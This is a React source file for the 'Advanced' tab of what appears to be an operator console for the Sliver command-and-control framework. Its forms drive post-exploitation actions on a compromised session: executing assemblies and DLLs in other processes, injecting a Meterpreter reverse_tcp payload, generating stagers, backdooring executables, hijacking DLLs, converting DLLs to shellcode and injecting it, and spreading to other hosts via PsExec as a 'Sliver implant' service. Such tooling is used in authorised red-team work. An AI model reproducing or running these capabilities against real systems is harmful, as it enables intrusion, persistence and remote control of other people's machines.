import { useState } from 'react'
import { useTranslation } from 'react-i18next'
import { api } from '../../lib/api'

function toBase64(file: File): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => {
      const result = reader.result as string
      resolve(result.split(',')[1] || '')
    }
    reader.onerror = reject
    reader.readAsDataURL(file)
  })
}

export default function AdvancedTab({ sessionId }: { sessionId: string }) {
  const { t } = useTranslation()
  const [mode, setMode] = useState<'assembly' | 'sideload' | 'spawndll'>('assembly')
  const [file, setFile] = useState<File | null>(null)
  const [args, setArgs] = useState('')
  const [process, setProcess] = useState('')
  const [entryPoint, setEntryPoint] = useState('main')
  const [output, setOutput] = useState('')
  const [error, setError] = useState('')
  const [running, setRunning] = useState(false)
  const [reconSec, setReconSec] = useState('60')
  const [reconMsg, setReconMsg] = useState('')
  const [reconError, setReconError] = useState('')
  const [reconfiguring, setReconfiguring] = useState(false)

  const [msfMode, setMsfMode] = useState<'msf' | 'msfRemote'>('msf')
  const [msfPayload, setMsfPayload] = useState('windows/meterpreter/reverse_tcp')
  const [msfLhost, setMsfLhost] = useState('')
  const [msfLport, setMsfLport] = useState('4444')
  const [msfEncoder, setMsfEncoder] = useState('')
  const [msfIterations, setMsfIterations] = useState('0')
  const [msfPid, setMsfPid] = useState('')
  const [msfMsg, setMsfMsg] = useState('')
  const [msfError, setMsfError] = useState('')
  const [msfRunning, setMsfRunning] = useState(false)

  const [stageArch, setStageArch] = useState('amd64')
  const [stageFormat, setStageFormat] = useState('raw')
  const [stageHost, setStageHost] = useState('')
  const [stagePort, setStagePort] = useState('443')
  const [stageProtocol, setStageProtocol] = useState('tcp')
  const stageOs = 'windows'
  const [stager, setStager] = useState<{ FileName: string; DataB64: string; Size: number } | null>(null)
  const [stageError, setStageError] = useState('')
  const [stageRunning, setStageRunning] = useState(false)

  const [bdPath, setBdPath] = useState('')
  const [bdProfile, setBdProfile] = useState('')
  const [bdMsg, setBdMsg] = useState('')
  const [bdError, setBdError] = useState('')
  const [bdRunning, setBdRunning] = useState(false)

  const [hjRefPath, setHjRefPath] = useState('')
  const [hjTarget, setHjTarget] = useState('')
  const [hjProfile, setHjProfile] = useState('')
  const [hjRefFile, setHjRefFile] = useState<File | null>(null)
  const [hjTargetFile, setHjTargetFile] = useState<File | null>(null)
  const [hjMsg, setHjMsg] = useState('')
  const [hjError, setHjError] = useState('')
  const [hjRunning, setHjRunning] = useState(false)

  const [rdiFile, setRdiFile] = useState<File | null>(null)
  const [rdiFunction, setRdiFunction] = useState('')
  const [rdiArgs, setRdiArgs] = useState('')
  const [rdiShellcode, setRdiShellcode] = useState<{ DataB64: string; Size: number } | null>(null)
  const [rdiError, setRdiError] = useState('')
  const [rdiRunning, setRdiRunning] = useState(false)

  const [scFile, setScFile] = useState<File | null>(null)
  const [scPid, setScPid] = useState('')
  const [scRwx, setScRwx] = useState(true)
  const [scMsg, setScMsg] = useState('')
  const [scError, setScError] = useState('')
  const [scRunning, setScRunning] = useState(false)

  const [peHost, setPeHost] = useState('')
  const [peProfile, setPeProfile] = useState('')
  const [peServiceName, setPeServiceName] = useState('Sliver')
  const [peServiceDesc, setPeServiceDesc] = useState('Sliver implant')
  const [peBinPath, setPeBinPath] = useState('C:\\Windows\\Temp')
  const [peMsg, setPeMsg] = useState('')
  const [peError, setPeError] = useState('')
  const [peRunning, setPeRunning] = useState(false)

  const reconfigure = async () => {
    const seconds = Number(reconSec)
    if (!Number.isFinite(seconds) || seconds <= 0) {
      setReconError(t('advanced.reconInvalid'))
      return
    }
    setReconfiguring(true)
    setReconError('')
    setReconMsg('')
    try {
      await api.reconfigureSession(sessionId, Math.round(seconds))
      setReconMsg(t('advanced.reconDone', { seconds }))
    } catch (e) {
      setReconError((e as Error).message)
    } finally {
      setReconfiguring(false)
    }
  }

  const runMsf = async () => {
    setMsfRunning(true)
    setMsfError('')
    setMsfMsg('')
    try {
      const opts = {
        payload: msfPayload.trim(),
        lhost: msfLhost.trim(),
        lport: Number(msfLport) || 4444,
        encoder: msfEncoder.trim() || undefined,
        iterations: Number(msfIterations) || 0,
      }
      if (msfMode === 'msf') {
        await api.msf(sessionId, opts)
      } else {
        await api.msfRemote(sessionId, { ...opts, pid: Number(msfPid) || 0 })
      }
      setMsfMsg(t('advanced.msfOk'))
    } catch (e) {
      setMsfError((e as Error).message)
    } finally {
      setMsfRunning(false)
    }
  }

  const generateStage = async () => {
    setStageRunning(true)
    setStageError('')
    setStager(null)
    try {
      const s = await api.msfStage({
        arch: stageArch,
        format: stageFormat,
        host: stageHost.trim(),
        port: Number(stagePort) || 443,
        os: stageOs,
        protocol: stageProtocol,
        bad_chars: [],
      })
      setStager(s)
    } catch (e) {
      setStageError((e as Error).message)
    } finally {
      setStageRunning(false)
    }
  }

  const downloadStage = () => {
    if (!stager) return
    const data = atob(stager.DataB64)
    const bytes = new Uint8Array(data.length)
    for (let i = 0; i < data.length; i++) bytes[i] = data.charCodeAt(i)
    const blob = new Blob([bytes], { type: 'application/octet-stream' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = stager.FileName
    a.click()
    URL.revokeObjectURL(url)
  }

  const runBackdoor = async () => {
    setBdRunning(true)
    setBdError('')
    setBdMsg('')
    try {
      await api.backdoor(sessionId, { file_path: bdPath.trim(), profile_name: bdProfile.trim() })
      setBdMsg(t('advanced.backdoorOk'))
    } catch (e) {
      setBdError((e as Error).message)
    } finally {
      setBdRunning(false)
    }
  }

  const runHijackDll = async () => {
    setHjRunning(true)
    setHjError('')
    setHjMsg('')
    try {
      const refB64 = hjRefFile ? await toBase64(hjRefFile) : ''
      const targetB64 = hjTargetFile ? await toBase64(hjTargetFile) : ''
      await api.hijackDll(sessionId, {
        reference_dll_path: hjRefPath.trim(),
        target_location: hjTarget.trim(),
        reference_dll_b64: refB64,
        target_dll_b64: targetB64,
        profile_name: hjProfile.trim(),
      })
      setHjMsg(t('advanced.hijackOk'))
    } catch (e) {
      setHjError((e as Error).message)
    } finally {
      setHjRunning(false)
    }
  }

  const convertRdi = async () => {
    if (!rdiFile) return
    setRdiRunning(true)
    setRdiError('')
    setRdiShellcode(null)
    try {
      const b64 = await toBase64(rdiFile)
      const res = await api.shellcodeRdi({
        data_b64: b64,
        function_name: rdiFunction.trim(),
        arguments: rdiArgs,
      })
      setRdiShellcode(res)
    } catch (e) {
      setRdiError((e as Error).message)
    } finally {
      setRdiRunning(false)
    }
  }

  const downloadRdi = () => {
    if (!rdiShellcode) return
    const data = atob(rdiShellcode.DataB64)
    const bytes = new Uint8Array(data.length)
    for (let i = 0; i < data.length; i++) bytes[i] = data.charCodeAt(i)
    const blob = new Blob([bytes], { type: 'application/octet-stream' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'rdi.bin'
    a.click()
    URL.revokeObjectURL(url)
  }

  const runShellcode = async () => {
    if (!scFile) return
    setScRunning(true)
    setScError('')
    setScMsg('')
    try {
      const b64 = await toBase64(scFile)
      await api.execShellcode(sessionId, { data_b64: b64, pid: Number(scPid) || 0, rwx_pages: scRwx })
      setScMsg(t('advanced.shellcodeOk'))
    } catch (e) {
      setScError((e as Error).message)
    } finally {
      setScRunning(false)
    }
  }

  const runPsExec = async () => {
    setPeRunning(true)
    setPeError('')
    setPeMsg('')
    try {
      const res = await api.psexec(sessionId, {
        hostname: peHost.trim(),
        profile_name: peProfile.trim(),
        service_name: peServiceName.trim() || 'Sliver',
        service_desc: peServiceDesc.trim() || 'Sliver implant',
        bin_path: peBinPath.trim() || 'C:\\Windows\\Temp',
      })
      setPeMsg(`${t('advanced.psexecOk')} ${res.host} (${res.service})`)
    } catch (e) {
      setPeError((e as Error).message)
    } finally {
      setPeRunning(false)
    }
  }

  const run = async () => {
    if (!file) return
    setRunning(true)
    setError('')
    setOutput('')
    try {
      const b64 = await toBase64(file)
      let res: { output?: string; result?: string }
      if (mode === 'assembly') {
        const r = await api.execAssembly(sessionId, b64, args, process)
        res = { output: r.output }
      } else if (mode === 'sideload') {
        const r = await api.sideload(sessionId, b64, process, args, entryPoint)
        res = { result: r.result }
      } else {
        const r = await api.spawnDll(sessionId, b64, process, args, entryPoint)
        res = { result: r.result }
      }
      setOutput(res.output || res.result || '(no output)')
    } catch (e) {
      setError((e as Error).message)
    } finally {
      setRunning(false)
    }
  }

  return (
    <>
      <div className="card">
        <div className="card-title">{t('advanced.reconTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field">
            <label>{t('advanced.reconInterval')}</label>
            <input value={reconSec} onChange={(e) => setReconSec(e.target.value)} />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn" onClick={reconfigure} disabled={reconfiguring}>
              {reconfiguring ? t('common.loading') : t('advanced.reconApply')}
            </button>
          </div>
        </div>
        {reconError && <div className="error-banner">{reconError}</div>}
        {reconMsg && (
          <div className="success-banner">
            {reconMsg}
          </div>
        )}
      </div>
      <div className="card">
        <div className="card-title">{t('advanced.title')}</div>
      <div className="form-grid" style={{ marginBottom: 12 }}>
        <div className="field">
          <label>{t('advanced.mode')}</label>
          <select value={mode} onChange={(e) => setMode(e.target.value as typeof mode)}>
            <option value="assembly">.NET Assembly</option>
            <option value="sideload">{t('advanced.sideloadLabel')}</option>
            <option value="spawndll">{t('advanced.spawnDllLabel')}</option>
          </select>
        </div>
        <div className="field">
          <label>{t('advanced.file')}</label>
          <input type="file" onChange={(e) => setFile(e.target.files?.[0] || null)} />
        </div>
        <div className="field">
          <label>{t('advanced.args')}</label>
          <input value={args} onChange={(e) => setArgs(e.target.value)} placeholder="arg1 arg2" />
        </div>
        <div className="field">
          <label>{t('advanced.process')}</label>
          <input value={process} onChange={(e) => setProcess(e.target.value)} placeholder="notepad.exe" />
        </div>
        {mode !== 'assembly' && (
          <div className="field">
            <label>{t('advanced.entryPoint')}</label>
            <input value={entryPoint} onChange={(e) => setEntryPoint(e.target.value)} />
          </div>
        )}
        <div className="field" style={{ justifyContent: 'flex-end' }}>
          <button type="button" className="btn primary" onClick={run} disabled={!file || running}>
            {running ? t('common.loading') : t('advanced.run')}
          </button>
        </div>
      </div>
      {error && <div className="error-banner">{error}</div>}
      {output && (
        <div className="exec-output">
          <div className="exec-output-header">
            <span>{t('exec.output')}</span>
          </div>
          <pre>{output}</pre>
        </div>
      )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.msfTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field">
            <label>{t('advanced.msfMode')}</label>
            <select value={msfMode} onChange={(e) => setMsfMode(e.target.value as typeof msfMode)}>
              <option value="msf">{t('advanced.msfLocal')}</option>
              <option value="msfRemote">{t('advanced.msfRemote')}</option>
            </select>
          </div>
          <div className="field" style={{ flex: 2 }}>
            <label>{t('advanced.msfPayload')}</label>
            <input value={msfPayload} onChange={(e) => setMsfPayload(e.target.value)} />
          </div>
          <div className="field">
            <label>LHOST</label>
            <input value={msfLhost} onChange={(e) => setMsfLhost(e.target.value)} placeholder="10.10.0.1" />
          </div>
          <div className="field">
            <label>LPORT</label>
            <input value={msfLport} onChange={(e) => setMsfLport(e.target.value)} />
          </div>
          <div className="field">
            <label>{t('advanced.msfEncoder')}</label>
            <input value={msfEncoder} onChange={(e) => setMsfEncoder(e.target.value)} placeholder="x86/shikata_ga_nai" />
          </div>
          <div className="field">
            <label>{t('advanced.msfIterations')}</label>
            <input value={msfIterations} onChange={(e) => setMsfIterations(e.target.value)} />
          </div>
          {msfMode === 'msfRemote' && (
            <div className="field">
              <label>PID</label>
              <input value={msfPid} onChange={(e) => setMsfPid(e.target.value)} />
            </div>
          )}
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={runMsf} disabled={msfRunning || !msfPayload || !msfLhost}>
              {msfRunning ? t('common.loading') : t('advanced.msfRun')}
            </button>
          </div>
        </div>
        {msfError && <div className="error-banner">{msfError}</div>}
        {msfMsg && (
          <div className="success-banner">
            {msfMsg}
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.stagerTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field">
            <label>{t('advanced.stagerArch')}</label>
            <select value={stageArch} onChange={(e) => setStageArch(e.target.value)}>
              <option value="amd64">amd64</option>
              <option value="386">386</option>
            </select>
          </div>
          <div className="field">
            <label>{t('advanced.stagerFormat')}</label>
            <input value={stageFormat} onChange={(e) => setStageFormat(e.target.value)} placeholder="raw" />
          </div>
          <div className="field">
            <label>{t('advanced.stagerProtocol')}</label>
            <select value={stageProtocol} onChange={(e) => setStageProtocol(e.target.value)}>
              <option value="tcp">TCP</option>
              <option value="http">HTTP</option>
              <option value="https">HTTPS</option>
            </select>
          </div>
          <div className="field" style={{ flex: 2 }}>
            <label>LHOST</label>
            <input value={stageHost} onChange={(e) => setStageHost(e.target.value)} placeholder="10.10.0.1" />
          </div>
          <div className="field">
            <label>LPORT</label>
            <input value={stagePort} onChange={(e) => setStagePort(e.target.value)} />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={generateStage} disabled={stageRunning || !stageHost}>
              {stageRunning ? t('common.loading') : t('advanced.stagerGenerate')}
            </button>
          </div>
        </div>
        {stageError && <div className="error-banner">{stageError}</div>}
        {stager && (
          <div className="toolbar">
            <span className="mono">{stager.FileName}</span>
            <span className="mono">{stager.Size} bytes</span>
            <button type="button" className="btn sm" onClick={downloadStage}>
              {t('advanced.stagerDownload')}
            </button>
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.backdoorTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field" style={{ flex: 2 }}>
            <label>{t('advanced.backdoorPath')}</label>
            <input value={bdPath} onChange={(e) => setBdPath(e.target.value)} placeholder="C:\Windows\Temp\calc.exe" />
          </div>
          <div className="field">
            <label>{t('advanced.backdoorProfile')}</label>
            <input value={bdProfile} onChange={(e) => setBdProfile(e.target.value)} />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={runBackdoor} disabled={bdRunning || !bdPath || !bdProfile}>
              {bdRunning ? t('common.loading') : t('advanced.backdoorRun')}
            </button>
          </div>
        </div>
        {bdError && <div className="error-banner">{bdError}</div>}
        {bdMsg && (
          <div className="success-banner">
            {bdMsg}
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.hijackTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field" style={{ flex: 2 }}>
            <label>{t('advanced.hijackRefPath')}</label>
            <input value={hjRefPath} onChange={(e) => setHjRefPath(e.target.value)} placeholder="C:\Windows\System32\version.dll" />
          </div>
          <div className="field" style={{ flex: 2 }}>
            <label>{t('advanced.hijackTarget')}</label>
            <input value={hjTarget} onChange={(e) => setHjTarget(e.target.value)} placeholder="C:\Windows\Temp\version.dll" />
          </div>
          <div className="field">
            <label>{t('advanced.hijackProfile')}</label>
            <input value={hjProfile} onChange={(e) => setHjProfile(e.target.value)} />
          </div>
          <div className="field">
            <label>{t('advanced.hijackRefDll')}</label>
            <input type="file" onChange={(e) => setHjRefFile(e.target.files?.[0] || null)} />
          </div>
          <div className="field">
            <label>{t('advanced.hijackTargetDll')}</label>
            <input type="file" onChange={(e) => setHjTargetFile(e.target.files?.[0] || null)} />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={runHijackDll} disabled={hjRunning || !hjTarget}>
              {hjRunning ? t('common.loading') : t('advanced.hijackRun')}
            </button>
          </div>
        </div>
        {hjError && <div className="error-banner">{hjError}</div>}
        {hjMsg && (
          <div className="success-banner">
            {hjMsg}
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.rdiTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field">
            <label>{t('advanced.rdiDll')}</label>
            <input type="file" onChange={(e) => setRdiFile(e.target.files?.[0] || null)} />
          </div>
          <div className="field">
            <label>{t('advanced.rdiFunction')}</label>
            <input value={rdiFunction} onChange={(e) => setRdiFunction(e.target.value)} />
          </div>
          <div className="field" style={{ flex: 2 }}>
            <label>{t('advanced.rdiArgs')}</label>
            <input value={rdiArgs} onChange={(e) => setRdiArgs(e.target.value)} />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={convertRdi} disabled={rdiRunning || !rdiFile}>
              {rdiRunning ? t('common.loading') : t('advanced.rdiConvert')}
            </button>
          </div>
        </div>
        {rdiError && <div className="error-banner">{rdiError}</div>}
        {rdiShellcode && (
          <div className="toolbar">
            <span className="mono">rdi.bin</span>
            <span className="mono">{rdiShellcode.Size} bytes</span>
            <button type="button" className="btn sm" onClick={downloadRdi}>
              {t('advanced.rdiDownload')}
            </button>
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.shellcodeTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field">
            <label>{t('advanced.shellcodeBin')}</label>
            <input type="file" onChange={(e) => setScFile(e.target.files?.[0] || null)} />
          </div>
          <div className="field">
            <label>PID</label>
            <input value={scPid} onChange={(e) => setScPid(e.target.value)} placeholder="0" />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end', gap: 8, alignItems: 'center' }}>
            <label style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
              <input type="checkbox" checked={scRwx} onChange={(e) => setScRwx(e.target.checked)} />
              {t('advanced.shellcodeRwx')}
            </label>
            <button type="button" className="btn primary" onClick={runShellcode} disabled={scRunning || !scFile}>
              {scRunning ? t('common.loading') : t('advanced.shellcodeRun')}
            </button>
          </div>
        </div>
        {scError && <div className="error-banner">{scError}</div>}
        {scMsg && (
          <div className="success-banner">
            {scMsg}
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">{t('advanced.psexecTitle')}</div>
        <div className="form-grid" style={{ marginBottom: 12 }}>
          <div className="field">
            <label>{t('advanced.psexecHost')}</label>
            <input value={peHost} onChange={(e) => setPeHost(e.target.value)} placeholder="10.10.0.50" />
          </div>
          <div className="field">
            <label>{t('advanced.psexecProfile')}</label>
            <input value={peProfile} onChange={(e) => setPeProfile(e.target.value)} />
          </div>
          <div className="field">
            <label>{t('advanced.psexecServiceName')}</label>
            <input value={peServiceName} onChange={(e) => setPeServiceName(e.target.value)} />
          </div>
          <div className="field">
            <label>{t('advanced.psexecServiceDesc')}</label>
            <input value={peServiceDesc} onChange={(e) => setPeServiceDesc(e.target.value)} />
          </div>
          <div className="field" style={{ flex: 2 }}>
            <label>{t('advanced.psexecBinPath')}</label>
            <input value={peBinPath} onChange={(e) => setPeBinPath(e.target.value)} />
          </div>
          <div className="field" style={{ justifyContent: 'flex-end' }}>
            <button type="button" className="btn primary" onClick={runPsExec} disabled={peRunning || !peHost || !peProfile}>
              {peRunning ? t('common.loading') : t('advanced.psexecRun')}
            </button>
          </div>
        </div>
        {peError && <div className="error-banner">{peError}</div>}
        {peMsg && (
          <div className="success-banner">
            {peMsg}
          </div>
        )}
      </div>
    </>
  )
}
